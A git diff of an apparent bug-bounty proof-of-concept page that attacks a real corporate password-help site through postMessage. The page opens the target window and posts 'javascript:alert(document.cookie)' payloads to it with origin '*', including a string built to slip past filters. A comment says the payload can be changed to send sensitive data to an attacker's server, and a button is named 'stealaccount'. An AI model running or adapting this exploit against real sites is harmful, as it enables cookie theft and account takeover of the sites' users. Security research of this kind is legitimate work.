@@ -12,13 +12,13 @@
 var h1Win;
 var s;
 function openWin(){
-	h1Win = window.open("https://www.google.com");
+	h1Win = window.open("https://password.gtie.dell.com/PMUser/HelpFiles/en-US/Content/UserGuide/UG_Assigning_Temporary_Pass.htm?SearchType=Stem&Highlight=password");
 	}
 
 	function sendMessage(){
-		var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
+		//var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
 		//you can change the url payload for send back some sensitive information to the attacker's server
-		h1Win.postMessage(data,"*");
+		h1Win.postMessage("request%%%%%navigate%%%%%javascript:alert(document.cookie)^^^^^test^^^^^800^^^^^400","*");
 		console.log("postmessage reload a new iframe's height and width")
 	}
 
@@ -28,11 +28,9 @@ function openWin(){
         console.log('Get data from oneplus ---> ' + e);
 	//clearInterval(s);
     }, false);
-document.getElementById("openH1").addEventListener('click', openWin);
 document.getElementById("stealaccount").addEventListener('click', sendMessage);
 openWin();
-sendMessage();
+setTimeout(sendMessage(),50000);
 </script>
-<iframe src="https://www.sephora.com/profile/MyAccount" height="700px" width="900px"></iframe>
 </body>
 </html>
